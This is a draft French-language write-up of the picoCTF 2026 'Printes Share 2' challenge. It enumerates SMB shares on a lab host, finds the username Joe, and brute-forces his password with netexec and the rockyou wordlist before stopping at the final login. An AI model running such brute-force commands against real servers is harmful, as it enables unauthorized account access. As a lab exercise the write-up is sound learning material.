---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/Printes Share 2.md
# Draft: incomplete: stops before reading the flag
title: Printes Share 2
category: Forensics
ctf: picoCTF 2026
date: 2026-03-10
summary: hydra ne prends pas le SMBv1 on utilise netcat
tags:
- forensics
- picoctf-2026
lang: fr
draft: true
imported: true
---

```
smbclient -L //green-hill.picoctf.net -p 55039 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to green-hill.picoctf.net failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

Connexion

```
 smbclient //green-hill.picoctf.net/shares -p 55039 -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar  9 22:29:06 2026
  ..                                  D        0  Mon Mar  9 22:29:06 2026
  content.txt                         N     1107  Wed Feb  4 22:22:17 2026
  kafka.txt                           N     1080  Wed Feb  4 22:22:17 2026
  notification.txt                    N      260  Wed Feb  4 22:22:17 2026

                65536 blocks of size 1024. 58584 blocks available
smb: \> cat content.txt
cat: command not found
smb: \> exit
                                                                                                                                          
A secure-share
└─$ smbclient //green-hill.picoctf.net/secure-shares -p 55039 -N

tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                          
┌──(louk㉿loukman)-[~/CTF/PicoCtf/picoCTF
```

Chercher le username 

dans notification 
```
cat notification.txt                                     
Hi Joe,

We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team

```

Username :  **Joe**

Brute force

hydra ne prends pas le SMBv1 on utilise netcat 

Etape : 
convertir rockyou en latin-1 

```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou_utf8.txt

```

```
nxc smb green-hill.picoctf.net \                                                 
-u Joe \
-p rockyou_utf8.txt \
--port 52695 
```

![Screenshot](./images/obsidian/printes-share-2/pasted-image-20260310001848.png)

password:

**popcorn** 

Se connecter et récupérer le flag
```
smbclient //green-hill.picoctf.net/secure-shares -p 59536 -U Joe
```
